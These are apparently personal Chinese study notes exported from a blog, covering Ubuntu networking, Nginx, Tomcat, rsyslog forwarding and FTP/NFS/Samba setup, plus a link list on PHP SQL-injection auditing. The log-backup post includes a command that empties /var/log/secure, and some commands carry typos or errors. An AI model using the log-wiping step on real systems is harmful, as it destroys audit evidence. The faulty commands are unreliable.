systemctl stop keepalived systemctl start keepalived 不仅可以配合Apache使用，还可配合其他使用 Ubuntu 18.04新特性哈哈哈，前几天20.04都已经正式发布了，我听课进度太慢 内核是关键 网络配置多个地址，要用逗号分隔重启服务：sudo netplan apply 桥接的物理网卡设置为没有ip 桌面端： # ifconfig / ifup / if down 已经默认不安装了 # 对应上面 ip link set eth0 up / ip link set eth0 down networkctl命令 # 此命令地位更加突出 networkctl status / networkctl status eth0 # 查看不同网卡的状态和详细信息 ip命令ip link sudo ip link ens33 down # down掉, 相当于ifup sudo ip link ens33 up # 启动网卡, 相当于 ifdown ip link ls ens33 # 查看网卡的link信息 ip -s -d link ls ens33 # 查看网卡的link信息(更详细) ip -s -s -d link ls ens33 # 查看网卡的link信息(更更详细) ip link set dev ens33 mtu 1500 # 修改MTU ip link set dev ens33 address 00:11:22:33:44:55 # 修改MAC ip addr ip addr # ip a ip addr show # 跟上面没什么差别 ip addr add dev ens33 192.168.1.10/24 # 手动给网卡添加ip ip addr del dev ens33 192.168.1.10/24 # 手动给网卡删除ip ip addr fulsh dev ens33 # 清除网卡信息 ip route ip route show # 查看路由信息 ip route ip route get 1.1.1.1 # 查看到达指定目的ip，计算要经过的路由 sudo ip route default via 192.168.1.2 # 添加默认路由(网关地址) sudo ip route dev ens33 2.0.0.0/8 via 192.168.1.1 # 指定去往某个网络，都要经过1.1这个路由，并指定网卡进行转发 ip maddress # 组播地址 ip maddress # 查看所有网卡都属于哪个组播地址 ip maddress ls ens33 # 查看指定网卡属于哪个组播地址 ip maddress add 33:33:00:00:00:01 dev ens33 # 把哪个网卡加入到某个组播地址 ip neighbor查arp缓存 # 查看 ip neigh ip -s -s neighbor show # 手动绑定ip与mac地址（防止arp欺骗） lladdr即逻辑链路层地址， perm是永久生效 ip neighbor add dev ens33 192.168.0.131 lladdr 00:11:22:33:44:55 nud perm ip monitor监视网络里面地址等解析的变化 ip monitor all # 有着不同的状态 Nginx 开源，轻量，快速，可扩展的Web服务器 Github, Netflix, Wordpress都基于Nginx 但是可配置能力弱于Apache 适用于大流量，高并发环境（稳定快速，占用资源少–C10K问题） 在Top 1000个网站中使用率最高 Apache基于线程 基于进程(运行中的文件就叫进程)消耗资源多 同进程下的多线程共享内存（一损俱损） Nginx使用事件驱动的架构 新客户端请求时不创建新的进程/线程 事件处理器处理请求任务 更少的处理时间，更少的内存消耗 Apache与Nginx共用 Apache处理动态内容 Nginx处理静态内容 安装sudo apt install nginx # 配置文件在 /etc/nginx 配置文件# /etc/nginx # 主配置文件 nginx.conf # 虚拟主机配置文件 sites-available sites-enabled # 启用的，是个链接 snippets # 可以复用的片段 主配置文件# /etc/nginx/nginx.conf user www-data; # 用户 worker_processes auto; # 进程数 include /etc/nginx/modules-enabled/*.conf; # 引入的模块配置 events { worker_connections 768; # 每个进程最大的并发连接数 # multi_accept on; } http { sendfile on; # 对内核 静态资源的访问速度(都要开着) tcp_nopush on; # 优化了对tcp协议栈性能(优化了数据包的大小,多个小包变成大包再发) tcp_nodelay on; # 与上面的参数相反(从发包的延时进行优化,来一个包就发) keepalive_timeout 65; # 没一个TCP连接最大的保活的时间 types_hash_max_size 2048; # MIME类型镜头内容hash表大小 ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } 虚拟主机配置文件ip和端口一样，使用不同域名来指向不同站点 # /etc/nginx/sites-available/ # 可用站点 # /etc/nginx/sites-enabled/ # 已启用站点 # /etc/nginx/sites-available/default server{ listen 80 default_server; # 侦听的端口 root /var/www/htmll; # 根目录 index index.html index.htm index.nginx-debian.html; # 索引文件 server_name www.xpsshuai.cn; # 主机名(域名) } location / { # 主url # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; # 资源没有就404 } 新建虚拟主机(Server Blocks)实例 Nginx中叫服务器块，但东西跟Apache中虚拟主机是一样的 sudo mkdir /var/www/qq.com # 每个单独的Server Block一个配置文件 sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/qq.com sudo vim /etc/nginx/sites-available/qq.com # 内容 server{ listen 80; # 因为这里都侦听80端口，所以为了和默认站点区分，要指定不同域名 server_name www.qqq.com; root /var/www/qq.com; } # 其他配置项可以取消注释自行配置 location ~ /\.ht { # 这个建议启用，以..开头,以ht结尾的你我们就拒绝访问-->当然也可以增加更多策略 deny all; } # 创建启用的符号链接(Apache是site2enable，这里没有专门的命令) sudo ln -s /etc/nginx/sites-available/qq.com /etc/nginx/sites-enabled/qq.com # 重启 sudo systemctl restart nginx # 访问域名，就会访问到qq.com，因为请求中的host字段是不一样的 # 其他站点同上 Nginx支持PHPWebServer本身只是提供资源的，必须配合php等脚本才能进行逻辑的运算 1.安装fastCGI process manager(FPM) –&gt; 就能配合Nginx配合进行处理(Nginx把接收到的请求转发给php处理) sudo apt install php-fpm # 安装 # 查看位置 ls /var/run/php/ /var/run/php/php7.2-fpm.sock # 进程名称(记住路径) # 验证 php-v 2.配置Nginx # 修改配置 sudo vim /etc/nginx/sites-available/qq.com location ~ \.php$ { # 匹配所有访问.php的请求 include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; # 意思是: 把所有访问.php的拓展名的资源，都转发给这里pass的php进程 } # 还有，索引页面也要添加 index.php 3.配置PHP # sudo vim /etc/php/7.2/fpm/php.ini # 这里只简单讲几个配置 cgi.fix_pathinfo=0 # 必须修改为0, 安全 file_uploads = On # 如果不需要就关掉，看自己需求 max_file_uploads = 20 # 限制单个文件上传大小 allow_url_fopen = On # 是否允许文件包含(如果没业务需要，建议关闭) allow_url_include = Off memory_limit = 128M # 指定内存大小(最小128M,看业务需求) 4.重新加载 sudo nginx -t sudo systemctl reload nginx # 重启php sudo systemctl restart php7.2-fpm 5.重新访问php页面，查看是否正确解析 Nginx支持SSL自签名证书 (自己测试或者不需要那么安全的情况下) –&gt; 机密性和完整性可以保证，但是身份认证是不会被公网所信任的 # x509标准格式的, 私钥是绝对不能泄漏的, 后面是绑定的一个证书 sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/qq.key -out /etc/ssl/certs/qq.pem # 一旦域名绑定了证书，就必须通过这个域名来访问 # 若向CA证书颁发机构申请证书方法 同上Apache 服务块配置 # sudo vim /etc/nginx/sites-available/qq.com server { listen 443 ssl; # 443端口是 ssl, 通过https访问 server_name www.qqq.com; ssl_certificate /etc/ssl/certs/qq.pem; ssl_certificate_key /etc/ssl/private/qq.key; root /var/www/qq.com } # 重启服务 systemctl restart nginx # 访问https://xxxxxx 会发现浏览器会提示证书不信任 Let’s encrypt第三方的https的开源的免费证书颁发机构，向他来申请证书 1.安装 sudo add-apt-repository ppa:certbot/certbot # 添加仓库 sudo apt update sudo apt install cerbot # 客户端程序(简化了申请流程) sudo apt install python-cerbot-nginx 2.使用方法： # 前提 域名正常解析、设置好虚拟主机 # 2.1申请证书 (--nginx意思是给nginx用的， -d是域名,还有子域名) , -m是管理员邮箱 sudo certbot --nginx -d example.com -d www.example.com -m admin@example.com # 证书存放位置 /etc/letsencrypt/live # 2.2修改自己配置文件中证书的位置 # sudo vim /etc/nginx/sites-available/qq.com ssl_certificate # 2.3 手动证书更新(因为默认证书有效期是90天) sudo certbot renew --dry-run # 2.4测试 查看证书状态(输入自己的域名) 可以查看到一些安全隐患等详细信息 https://www.ssllab.com/ssltest/ # ssl的信息扫描(不安全的地方)也可以使用自己本地的工具 Nginx反向代理 很多情况下，Nginx不是作为WebServer使用的，最常见的就是作为反向代理 首先说一下代理: 代理客户端访问外网服务器。代理是重新生成的请求(比如公司内部限制员工上网的场景)反向代理： - 代理服务器对外提供服务，接受客户端请求 - 安全层过滤客户端恶意请求(云) - 可以放在防火墙外面，甚至放在云上(云WAF本质上就是反向代理, 请求通过DNS解析到云waf上，进行过滤) Apache不适用于高并发，高负载环境 Nginx没有内建支持动态内容处理能力 结合Apache/Nginx的优势 Nginx接受入站请求和静态内容缓存，动态请求发给Apache Apache完成动态内容处理 Nginx作为反向代理（动态请求转发给Apache） Nginx放在WebServer前面，再将请求发给WebServer。然后服务端把数据通过Nginx向用户交付数据 不仅减缓了Apache的流量压力，也进行了一定的安全过滤 Nginx实现反向代理 同一台服务器的流量转发 1.本机安装Apache 注意: 先停掉nginx的服务 systemctl stop nginx 再安装 sudo apt install apache2 2.修改Apache侦听端口 1. # vim /etc/apache2/ports.conf #让apache不占用80, 让nginx侦听80端口 Listen 8080 &lt;IfModule ssl_module> Listen 8443 &lt;/IfModule> &lt;IfModule mod_gnutls.c> Listen 8443 &lt;/IfModule> 2.修改apache虚拟站点默认侦听端口 vim /etc/apache2/sites-available/000-default.conf 也改为8080 3.重启服务 systemctl restart apache2 3.Nginx反向代理设置 # vim /etc/nginx/sites-available/default #修改nginx配置，侦听80端口，然后动态部分的流量转发给apache,而静态文件还是放Nginx上读取(这里以php为例) # 动态内容进行转发 location ~ \.php$ { include snippets/fastcgi-php.conf; # fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; # 这里就不用nginx解析php了，用apache(配置在上面小结) proxy_pass http://127.0.0.1:8080; # 凡是php的动态内容都转发给本机的8080(即Apache) proxy_set_header X-Real-IP $remote_addr; # 通常会添加一些代理请求头(便于区分) proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 这个头部虽然不是RFC标准，但是也是记录了经过了哪些代理地址 proxy_set_header Host $host; proxy_set_header X-Forward-Proto $scheme; } # 静态内容留给自己（增加一个location） location ~* \.(js|css|jpg|png|svg|html|htm)$ { expires 10d; # 指定过期时间 10天 } 4.检查Nginx配置并重启 sudo nginx -t # 检查配置语法 sudo systemctl restart nginx # 重启 5.配置Apache支持php解析 # 1.安装 sudo apt install php7.2 libapache2-mod-php7.2 # mod-php模块 # 验证 php -v # 2.启用模块 a2enmod php7.2 # 3.索引文件 vim /etc/apache2/mods-available/dir.conf # 增加index.php # 4.重启apache sudo systemctl restart apache2 6.测试能否正常访问 多台服务器的Nginx反响代理，进行流量转发实验环境：一台ubuntu安装apache, 两台虚拟机安装Nginx客户端向第一台Nginx服务器发送请求，转发给第二台Nginx服务器，然后转发给最后一台Apache链式代理 1.Nginx机器 N11.安装Nginx2.配置(这里做实验就简单地用了默认的配置了) # /etc/nginx/sites-available/default location / { # 所有发到我这里的请求都转发给N2 proxy_pass http://192.168.0.104; } 3.重启Nginx 2.Nginx机器 N21.安装Nginx2.配置 # /etc/nginx/sites-available/default location / { # 所有发到我这里的请求都转发给N2 proxy_pass http://192.168.0.105; } 3.重启Nginx 3.Apache机器 A3安装apache然后客户端访问N1, 就会看到A3的页面 Nginx负载均衡 基于反向代理实现负载均衡 负载均衡： 前面放一个Nginx进行反向代理，后面放多个Apache作为WebServer 基本配置 # 定义一个服务器组(要转发到的目标组) upstream srvs { # upstream只是一个组的名称 least_conn; # 负载均衡方法规则 --最少连接数优先 (详细见下面) server 192.168.106:80 weight=1; # server 是后面的一个WebServer(apache或Nginx)的地址， weight 是权重(越大接收的流量就越多) server 192.168.106:80 weight=2; } # 配置 server { location / { proxy_pass http://srvs; # 上面定义的组的名称(不需要被DNS解析，仅仅是一个标识) } } 负载均衡方法 round-robin # 论询 least_conn # 最少连接数优先(已经建立的连接数) least_time # 响应速度最快 hash # 基于请求的Hash值 ip_hash # 基于ip地址的hash值(适用于需要会话保持的场景) 日志/var/log/nginx/access.log /var/log/nginx/error.log TomcatTomcat是由Apache组织开发的一个Servlet(Server Applet)容器 实现对servlet, JSP, JAVA Socket等支持 包含http服务器 作为中间件使用 可与Nginx结合使用(只用Tomcat的话, 抗压能力强) servlet是优于CGI的方式的 安装 open jdk一般tomcat和java配合较多jdk是开发环境，jre是运行环境 sudo apt install default-jdk #安装openjdk。 使用默认版本 或者指定openjdk-8-jdk 安装 oracle jdk安装 sudo apt install software-properties-common -y sudo add-apt-repository ppa:webupd8team/java sudo apt install oracle-java8-installer -y java版本选择 sudo update-alternatives --config java sudo update-alternatives --config javac java --version 或者手动下载oracle jdk包 官方库安装tomcat# ubuntu中收录的8 sudo apt install tomcat8 sudo apt install tomcat8-docs sudo apt install tomcat8-admin sudo apt install tomcat8-examples # tomcat默认不是主要作为WebServer的，一般是配合Apache和Nginx，所以默认使用8080端口 手动安装tomcat适用于指定具体版本1.先安装jdk sudo apt install default-jdk #安装openjdk。 使用默认版本 或者指定openjdk-8-jdk # 验证 java --version sudo useradd -m -U -d /opt/tomcat -s /bin/false tomcat # 创建tomcat帐号（home放在opt下面） 2.再下载安装包 3.移动到/opt/tomcat目录 mv apache-tomcat-8.5.31 /opt/tomcat/ 4.修改该文件递归的属主属组改为新建的tomcat用户 # 建议建立符号链接 sudo ln -s /opt/tomcat/apache-tomcat-8.5.31 /opt/tomcat/latest # 把新版本添加链接即可(版本更新之后不需要更改配置文件，配置文件都配置latest,而只需把latest修改指向即可) sudo chown -R tomcat:/opt/tomcat sudo chmod +x /opt/tomcat/latest/bin/*.sh # sudo chmod +x /opt/tomcat/apache-tomcat-8.5.31/bin/*.sh 手动创建systemd管理文件(手动安装就没有systemd的后台管理文件)/etc/systemd/system/sudo vim tomcat.service配置内容如下 6.启动服务 # 重新reload sudo systemctl daemon-reload # 启动tomcat sudo systemctl start tomcat sudo systemctl status tomcat # 设置开机启动启动 sudo systemctl enable tomcat 7.Web管理接口配置 # http://ip:8080/manager/ # tomcat管理页面，默认是只允许本机访问的 ## 1.若想开启，就需进行配置（这里指定允许某个ip访问） sudo vim /opt/tomcat/latest/conf/tomcat-user.xml # 自动安装tomcat后的路径在/etc &lt;tomcat-user> &lt;role rolename="admin-gui"/> # 定义两个角色 &lt;role rolename="manager-gui"/> &lt;user username="admin" password="qwe123" roles="admin-gui, manager-gui"/> # 定义用户 &lt;/tomcat-user> ## 2.指定登录主机 # sudo vim /opt/tomcat/latest/webapps/manager/META-INF/context.xml # 自动安装tomcat后的路径自己找 如下图(懒得弄格式了) # sudo vim /opt/tomcat/latest/webapps/host-manager/META-INF/context.xml 这是管理主机的配置文件 ## 3.重启服务，然后测试 systemctl restart tomcat8 xxx:8080/manager/html # 管理页面就可以部署war包等操 xxx:8080/host-manager/html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>Web服务</tag>
        <tag>Apache</tag>
        <tag>Nginx</tag>
        <tag>Tomcat</tag>
        <tag>反向代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PHP代码审计】 那些年我们一起挖掘SQL注入--集合]]></title>
    <url>%2Fposts%2F43402%2F</url>
    <content type="text"><![CDATA[仅仅是简单把网上的文章放在一起，方便自己学习 https://www.cnblogs.com/xiaozi/p/5538369.html https://www.cnblogs.com/xiaozi/p/5538372.html https://www.cnblogs.com/xiaozi/p/5538374.html http://www.mamicode.com/info-detail-1391858.html https://www.cnblogs.com/xiaozi/p/5538380.html https://www.cnblogs.com/xiaozi/p/5538382.html https://www.cnblogs.com/chunguang/p/5583875.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux日志异地备份]]></title>
    <url>%2Fposts%2F52918%2F</url>
    <content type="text"><![CDATA[日志的异地备份 日志服务器的建立尤其重要 这里使用Centos的登录日志做实验 tail -f /var/log/secure 实时查看日志变化 echo " " &gt; var/log/secure 最简单的清理日志 常见日志文件/var/log/messages 大多数系统日志信息记录在此处 /var/log/secure 安全和身份认证相关的信息和错误的日志文件 /var/log/mallog 与邮件服务器相关的日志文件 /var/log/cron 与定时任务相关的日志文件 /var/log/boot.log 与系统启动有关的日志文件 发送方：考虑问题1.我发送什么信息表到日志服务器 2.考虑发送到ip哪个端口 3.使用什么协议 配置配置文件 vim /etc/rsyslog.conf # 这里配置登录日志， 指定日志类别和等级，协议和端口 ### begin forwarding rule ### #*.* @@remote-host:514 @@代表使用TCP authpriv.* @@192.168.0.111:514 ### Note： # 1.暂时关闭防火墙 setup # 关闭防火墙 iptables -nL # 查看一下 # 2.关闭SELinux setenforce 0 getenforce # 重启rsyslog 服务 接收方：考虑问题1.收谁的日志 2.收完存哪 3.用什么协议 配置配置文件 vim /etc/rsyslog.conf # 指定协议和端口 # Provides TCP syslog reception $ModLoad imtcp $InputTCPServerRun 514 # 收谁的，存哪 # 按照ip地址来收 :fromhost-ip, isequal, "192.168.0.100" /var/log/client_log/192.168.0.100.log # 重启rsyslog 服务 netstat -antlp |grep 514 # 查看端口是否开始监听了 完成 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>日志</tag>
        <tag>异地备份</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-文件服务]]></title>
    <url>%2Fposts%2F50043%2F</url>
    <content type="text"><![CDATA[文件服务 我的就是你的 - 你的还是你的 网络诞生最初的动因是去中心化和资源共享文件是初期最主要的资源共享形式（把文件存放在集中的位置供大家访问） 去中心化是另外一个话题 早期的军事需求 现在的信任需求 FTP服务最古老的就是FTP 产生于安全出现之前 明文传输一切 目前主要用于公开提供的文件下载服务(目前还没消亡) 使用简单、兼容性好 还有SFTP、FTPS等 FTP服务端软件 Server U vsftpd Proftpd 为了安全考虑 独立部署于企业防火墙之外 只读挂载存储或采用只读存储设备(CD / DVD) vsftp安装和配置和管理vsftpd – 灵活、安全的FTP服务端软件 安装sudo apt install vsftpd # 安装过程中生成ftp账号（anonymous） 主目录在：/srv/ftp # 默认是21端口进行会话 FTP账号 # 安装完之后会自动创建一个ftp账号（这个账号是不能使用shell和登录机器 ） /etc/passwd # bin/false 表示不能使用shell /etc/shadow # * 表示不能使用终端 /srv/ftp # ftp用户主目录 配置两种配置模式 anonymous # 匿名模式（适用于公开共享文件） -- vsftpd安装好之后是默认禁用匿名登陆的 Standard # 认证模式 常见FTP客户端 # 用哪个账号登录，看到的文件就是哪个用户的主目录 # 1.使用命令行连接ftp服务器 ftp 192.168.1.130 # 2.浏览器 ftp://192.168.111.130 # 3.ftp客户端访问程序（FileZilla） # 4.文件同步客户端软件 1.匿名登录配置文件位置 /etc/vsftpd.conf # 主配置文件 开启匿名模式 sudo vim /etc/vsftpd.conf # 修改内容为 anonymous_enable=YES # 启用匿名账号登录 local_enable=NO # 禁用认证用户登录 # 重启vsftpd服务，检查状态 然后使用账号anonymous登录(命令行需要,其他方式不用)，密码不用输即可() 看到的目录是`/srv/ftp/` 开启匿名账号上传默认：匿名账号是不允许匿名上传的 sudo vim /etc/vsftpd.conf # 修改内容 write_enable=YES # 全局设置（以下配置生效的依赖） anon_upload_enable=YES # 允许匿名上传文件 anon_mkdir_write_enable=YES # 允许匿名创建目录 # 重启服务，检查状态 sudo systemctl restart vsftpd.service 但是还是不能上传的（因为vsftpd强制禁止在根目录下匿名上传） Note： ftp的主目录是不能进行上传文件的，因为这个目录对同组用户没有写的权限(`ls -ld`查看当前目录的权限)，就算你chmod修改了权限也是不行的 【解决办法】:在根目录新建文件然后上传 sudo mkdir /srv/ftp/upload # 创建上传目录 sudo chown ftp:ftp /srv/ftp/upload # 配置新建文件系统属主数组 # 继续新增配置 /etc/vsftpd.conf anon_umask=022 # 上传文件权限掩码(让上传的文件配置不同的权限 -- 看自己需要来配置) anon_other_wrote_enable=YES # 允许删除和重命名(否则删除不了也无法重命名) 修改FTP主目录 sudo mkdir /srv/files/ftp sudo chown -d /srv/files/ftp ftp 文件传输日志默认是开启的，可以查看恶意文件上传记录 # sudo vim /etc/vsftpd.conf xferlog_enable=YES # 默认开启 xferlog_file=/var/log/vsftpd.log # 默认日志存放位置(注释不注释他都默认往里面写，可修改) # 如果修改，重启服务 其他配置 idle_session_timeout=600 # 会话超时时长 no_anon_password=YES # 命令行登录禁用密码提示 hide_ids=YES # 显示属主/数组名称，而不显示uid和gid(uid会比较敏感) # 重启服务 端口 会话指令 -&gt; TCP 21端口 数据传输模式 主动模式（受客户端防火墙影响）– 客户端随机产生一个端口，告诉服务器 -&gt;服务端只使用 20端口 被动模式 （兼容性好，建议使用） – 服务端告诉客户端使用哪个端口传输 # 用什么模式，客户端说了算 # 都是客户端随机产生一个端口，告诉服务端 # 被动模式连接 ftp -p 192.168.0.130 限定被动模式数据通信端口 # sudo vim /etc/vsftpd.conf 新增配置 # 开放一个端口的范围(尽量少开) pasv_min_port=40001 pasv_max_port=40101 然后在服务器端边界防火墙上开放上述100个端口 2.身份认证登录身份认证登录TFP 安装之后的默认配置 不能上传 可回溯到根目录（存在安全隐患!!! –&gt; 使用chroot来解决） chrootchroot 将所有登录用户锁定在自己的主目录里（防止目录回溯） # 配置文件 sudo vim /etc/vsftpd.conf # 全局的配置参数(对所有用户) chroot_local_user=YES # 但是chroot的根目录不能是可写的 # 重启服务 # 默认主目录可写， 但是chroot的根目录不能是可写的，vsftp的禁止用户登录，好猫短 ————> 怎么办呢？看下面 （接上文）两种解决办法:1.为FTP登录指定新的主目录（建议使用） sudo mkdir ~/ftp &amp;&amp; chmod -w ftp # 新建主目录，并删除写入权限 # sudo vim /etc/vsftpd.conf local_root=/home/xps/ftp # 客户端只能看到这个目录里面，跳不出去 2.允许根目录写入（不建议，存在安全风险） # 配置文件 sudo vim /etc/vsftpd.conf write_enable=YES local_root=/home/xps allow_writeable_chroot=YES chroot 将指定登录用户锁定在自己的主目录里（防止目录回溯） # 配置文件 sudo vim /etc/vsftpd.conf # chroot_local_user=YES # 注释掉前面配置的全局的配置项 # 启用用户列表功能 chroot_list_enable=YES # 如果chroot_local_user=YES也开启了，就起了相反的作用(除了指定列表里面的用户之外, 都锁定在主目录里) # 指定用户列表文件 chroot_list_file=/etc/vsftpd.chroot_list # 编辑用户账号列表 vim /etc/vsftpd.chroot_list # 添加用户 xps ftp # 重启服务 禁止指定FTP登录账号 /etc/ftpusers # 默认禁止FTP登录账号(将用户加入进去) 上传文件权限掩码 # 跟匿名用户的配置是类似的 local_umask=022 文件同步客户端自动把我电脑的新的文件，上传到FTP服务器(类似于备份) – 有一些第三方软件(ubuntu自带的同步软件backup等) FTP安全1.FTPS: FTP over Secure Socket Layer(SSL) 账号无需shell登录权限 基于证书的加密 开启FTPS： # 安全性--指的是在数据传输过程中不会被别人嗅探 ssl_enable=YES # 启动FTPS rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem # 公钥 rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key # 私钥 # 重启服务 # 然后再连接的时候就是加密的了(浏览器需要ftps://ip) # 怎么加密的呢? # 简单来说：安装FTP时候默认会生成一对公钥和私钥 # 不建议使用安装FTP时候默认生成的证书，建议手动生成(每个应用一个证书, 每个证书有效期一两年) 手动生成证书 –&gt; 替换默认证书(安全考虑)：1.生成秘钥文件 # 使用ssl的一个开源组件openssl openssl genrsa -des3 -out ftp.key 4096 # 1024的已经不安全了 # 然后设置密码保护 2.生成不加密的秘钥文件 # 先还原为明文的密钥对 openssl rsa -in ftp.key -out ftp.key.insecure # 用完就删掉这个insecure文件 # 改名(这是加密的) mv ftp.key server.key.secure # 改名(这是明文的) mv server.key.insecure ftp.key 3.生成证书请求文件(使用上面的明文秘钥) – 实验使用的自签名证书 openssl req -new -key ftp.key -out ftp.csr # 然后输入一些证书的信息 这里使用自签名证书(生产环境建议由证书颁发机构前面生成证书)3.生成自签名证书 openssl x509 -req -days 365 -in ftp.csr -signkey ftp.key -out ftp.pem # -days 365有效期 4.部署证书 # ftp.key放到一个更安全的目录去 sudo cp ftp.key /etc/ssl/private/ # 此目录root才能看 sudo cp ftp.pem /etc/ssl/certs/ 5.修改/etc/vsftpd.cong中的key和公钥为刚才手动生成的证书， 然后重启服务 上面的操作也可以合并为一条命令 openssl x509 -req -node -days 365 -newkey rsa:4096 -keyout /etc/ssl/private/vsftpd.key -out /etc/ssl/private/vsftpd.pem 2.SFTP: 基于SSH加密隧道传输文件 账号需要shell登录权限（可设置禁止权限） 远程登录那一章已经学了 NFS服务 适用于类UNIX系统 NFS – Network File System 最早由SUN公司开发 类unix平台最主要的文件共享方法 基于RPC(Remote Procedure Call)协议 NFS是一个RPC Server （v3 、v4） 协议本身不加密，可结合SSH，Kerberos实现加密 隐藏式身份验证（难点） 权限配置是关键 服务端口: TCP 2049 安装 sudo apt-get install nfs-kernel-server # 服务端 sudo apt-get install nfs-common # 客户端 # 安装完，服务已经都启动了 ps -ef |grep rpc ps -ef |grep nfs 进程 rpcbind # RPC服务进程 nfsd # NFS主进程(身份识别) mountd # 根据 /etc/exports 配置验证权限 lockd # 锁定（需C/S同时启用） statd # 一致性（需C/S同时启用） 身份识别 客户端提供 UID / GID (与用户名、组名无关) 服务器按客户端UID /GID 赋权 若服务器无客户端UID / GID账号，则将客户端映射为匿名账号 nobody / nogroup (uid: 65534) 客户端使用root账号（UID 0），默认映射为匿名账号 可修改配置文件映射 UID 0 为服务端 ROOT （存在安全隐患） 如果客户端uid和服务端uid相同，则客户端会获得服务器端账号的权限；若不同，则客户端获取服务端的nobody权限(除非客户端是root账号,且服务端启用了客户端的root映射为服务端的root) 隐式的身份认证 权限体系 1.共享权限 2.文件系统权限 配置 sudo vim /etc/exports # 主配置文件 # 内容：共享目录,谁可以访问我, 权限，(sync是数据先写到内存在硬盘可靠,async是写到内存然后写的硬盘速度快)，no_subtree_check是不进行子目录的检查(建议使用) /exports/public 192.168.1.0/24(rw,sync,no_subtree_check) # 允许访问的范围可以使用通配符： *.lab.com no_root_squash # 禁用root默认映射为nobody(加在上面括号中的配置中) # sudo mkdir -p /exports/public # 创建共享目录 sudo chown nobody:nogroup /exports/public # 设置权限 sudo systemctl restart nfs-kernel-server # 重启服务 sudo exportfs # 查看共享目录 cat /var/lib/nfs/etab # 共享目录 cat /var/lib/nfs/xtab # 客户端信息 共享权限 ro/rw # 只读/只写 sync / async # 同步写入硬盘 / 暂存于内存中 all_squash # 所有用户全部映射为nobody anonuid / anongid # 支付那个匿名ID（默认65534） secure / insecure # 使用1024以下/以上端口 hide / no_hide # 共享 / 不共享NFS子目录 客户端挂载 # 和本地挂载设备一样(挂载到本地，但是访问是通过网络流量的) sudo mount 192.168.0.30:/export/public my_nfs/ # 写入文件的话 1.临时获取root权限，会默认转为nobody sudo xxxxx 2. chmod修改其他用户的权限后，直接写入即可(客户端的uid与服务端的uid相同的话) 启动挂载风险：nfs服务器如果出现问题，本地机器启动就会特别慢 # sudo vim /etc/fstab 192.168.1.30:/home /my_nfs/ nfs no_auto,nofail,noatime,nolock,intr,tcp,actimeo=1800 0 0 # 建议 no_auto 不自动挂载 其他命令 rpcinfo -p 192.168.1.30 # 查询RPC服务注册状态(客户端与服务端都可以执行) tail /var/log/kern.log # 服务器日志 showmount -e localhost # 显示共享目录 df -h # 客户端查看挂载 企业环境有统一域名和身份验证时 # 也要配置这个 sudo vim /etc/idpamd.conf Domain = lab.com Windows客户端企业版才可以添加nfs的支持 SAMBA服务SMB / CIFS 协议 全称Server message block / Common internet file system 最早由IBM研发，后由微软采用并不断完善 Windows文件和打印共享（之前使用的SMB协议, 后来改进为cifs协议） 端口：TCP 139(局域网), 445() / UDP 137(用来名称解析), 138 Samba 是开源世界逆向了SMB协议后打造的兼容微软SMB的文件共享服务 Samba还有其他功能、用途和使用场景 功能不仅限于此，但最常用的用途，还是做文件共享服务： NFS只适用于类Unix系统环境 Samba适用与Windows、Linux混合环境的文件共享需要 Samba实现了CIFS服务的四个基本功能1.文件和打印共享2.认证和授权3.名称解析4.服务宣告(browsing) 传输协议： NetBIOS # 局域网 NetBIOS over TCP/IP # 跨网段(把NetBIOS数据包封装之后跨网络传输) 后台进程 Smbd # 文件共享主进程 TCP: 139/445 Nmbd # WINS通信、名称解析 UDP: 137/138 Winbindd # 同步系统账号(把Linux系统的账户拷到samba的用户数据库中进行处理) 其他10多个进程 安装sudo apt install samba libpam-winbind 配置配置文件： /etc/samba/dhcp.conf # 指定WINS服务器（跨网段时候用） /etc/samba/smb.conf # 主配置文件 一. 配置验证用户名的Samba服务1.配置文件/etc/samba/smb.conf workgroup = WORKGROUP # [global] 工作组：net config worktation查看工作组 [Private] # 起个名(共享文件夹的名称) comment = prvivate share # 描述 path = /srv/private/ # 共享路径 browseable = no # 是否允许访问者可显示它这个共享文件夹(完整账号) guest ok = no # 禁用来宾账号 writable=yes # 可读写(read only=yes) create mask = 0700 # 新建文件权限 vaild users=@samba # 可访问共享的用户组(稍后会创建) # 2.创建用户/组/共享文件夹 sudo adduser user1 sudo groupadd smaba # 上面配置的组的名称 sudo gpasswd -a user1 samba sudo smbpasswd -a user1 # 设置用户SMB密码(不是操作系统的密码) sudo mkdir /srv/private/ # 创建共享目录 sudo 